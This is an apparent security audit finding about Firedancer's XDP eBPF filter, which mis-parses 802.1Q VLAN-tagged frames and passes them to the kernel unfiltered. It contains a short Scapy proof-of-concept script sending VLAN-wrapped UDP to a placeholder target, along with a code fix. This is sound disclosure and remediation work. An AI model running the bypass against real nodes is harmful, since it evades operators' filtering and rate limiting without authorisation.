# MEDIUM-HIGH: XDP Filter Bypass via 802.1Q VLAN Tags

**Category**: NET
**Severity**: Medium-High
**Component**: XDP eBPF Filter
**Location**: `src/waltz/xdp/fd_xdp1.c:98-105`

## Summary

The XDP eBPF filter assumes a fixed 14-byte Ethernet header and checks the Ethertype at offset 12 for IPv4 (0x0800). When an 802.1Q VLAN tag is present, the Ethernet header becomes 18 bytes, and offset 12 contains the VLAN tag protocol identifier (0x8100) instead of the actual Ethertype. The filter classifies VLAN-tagged packets as non-IPv4 and passes them to the kernel, which strips the VLAN tag and delivers the underlying UDP payload.

## Technical Details

```c
// fd_xdp1.c:101-105
*(code++) = FD_EBPF( ldxh, r5, r2, 12 );                  // eth_hdr->net_type
*(code++) = FD_EBPF( jne_imm, r5, 0x0008, LBL_PASS );    // if != IPv4 → pass to kernel
*(code++) = FD_EBPF( add64_imm, r2, 14 );                 // advance by fixed 14 bytes
```

With a VLAN-tagged frame, the layout is:
- Bytes 0-5: Destination MAC
- Bytes 6-11: Source MAC
- Bytes 12-13: TPID = 0x8100 (VLAN tag)
- Bytes 14-15: TCI (VLAN ID + priority)
- Bytes 16-17: Actual Ethertype (0x0800 for IPv4)
- Byte 18+: IPv4 header

The filter reads 0x8100 at offset 12, fails the 0x0800 comparison, and jumps to `LBL_PASS`, forwarding the packet to the kernel unfiltered.

## Proof of Concept

```python
#!/usr/bin/env python3
"""XDP VLAN bypass PoC - for authorized testing only"""
from scapy.all import *

target_ip = "TARGET_IP"
target_port = 8001

# Wrap a normal UDP packet in an 802.1Q VLAN tag
pkt = Ether()/Dot1Q(vlan=100)/IP(dst=target_ip)/UDP(dport=target_port)/b"payload"
sendp(pkt, iface="eth0")
```

## Impact

- XDP filter bypassed for all VLAN-tagged traffic
- Attacker can reach Firedancer's listening ports without XDP filtering
- Reduces effectiveness of any XDP-based rate limiting or filtering
- Practical exploitability depends on network topology (VLAN tags may be stripped by upstream switches, but GRE tunnels preserve them)

## Remediation

Detect 802.1Q tags and adjust parsing:

```c
*(code++) = FD_EBPF( ldxh, r5, r2, 12 );
*(code++) = FD_EBPF( jeq_imm, r5, 0x0081, LBL_VLAN );  // 0x8100 in network order
*(code++) = FD_EBPF( jne_imm, r5, 0x0008, LBL_PASS );
*(code++) = FD_EBPF( add64_imm, r2, 14 );
*(code++) = FD_EBPF( ja, 0, 0, LBL_IPV4 );
// LBL_VLAN:
*(code++) = FD_EBPF( ldxh, r5, r2, 16 );                // real ethertype after VLAN
*(code++) = FD_EBPF( jne_imm, r5, 0x0008, LBL_PASS );
*(code++) = FD_EBPF( add64_imm, r2, 18 );               // 14 + 4 byte VLAN tag
// LBL_IPV4: ...
```

## References

- `src/waltz/xdp/fd_xdp1.c:98-105` (Ethernet header parsing)
- IEEE 802.1Q VLAN tagging standard
